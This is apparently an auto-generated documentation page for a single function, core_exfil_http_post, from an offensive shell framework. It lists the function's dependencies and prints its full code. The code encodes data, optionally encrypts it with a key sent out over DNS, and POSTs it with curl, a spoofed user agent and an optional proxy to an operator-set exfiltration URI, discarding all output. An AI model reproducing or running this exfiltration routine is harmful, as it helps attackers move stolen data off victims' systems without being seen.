# Exfil Http Post

### Purpose
core_exfil_http_post function implementation from base.sh.

### Dependencies
| Type | Name | Value |
|------|------|-------|
| Global Variable | `CMD_CURL` | "curl" |
| Global Variable | `ENCODING_TYPE` | "none" |
| Global Variable | `ENCRYPT` | "none" |
| Global Variable | `ENCRYPTION_TYPE` | "none" |
| Global Variable | `ENCRYPT_KEY` | "" |
| Global Variable | `EXFIL_URI` | "" |
| Global Variable | `JOB_ID` | "" |
| Function | `core_exfil_http_post()` | For exfil http post |
| Function | `core_extract_domain()` | For extract domain |
| Function | `core_generate_json_payload()` | For generate json payload |
| Function | `core_normalize_uri()` | For normalize uri |
| Function | `core_prepare_exfil_data()` | For prepare exfil data |
| Function | `core_send_key_via_dns()` | For send key via dns |
| Function | `core_url_safe_encode()` | For url safe encode |

<details>

```shell
core_exfil_http_post() {
local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # For encrypted data, we need to handle the key
        local domain=$(core_extract_domain "$full_uri")
        local encrypted_key=$(core_send_key_via_dns "$domain")
        local json_payload=$(core_generate_json_payload "$encoded_data" "$encrypted_key")
        
        # Execute POST with JSON payload
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
            -H "Content-Type: application/json" \
                -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encryption: $ENCRYPTION_TYPE" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$json_payload" \
                        "$full_uri" > /dev/null 2>&1
                else
        # For unencrypted data, simpler payload
        local content_type=$(core_get_content_type)
        
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$encoded_data" \
                        "$full_uri" > /dev/null 2>&1
                fi
    
    return $?
}
```

</details> 
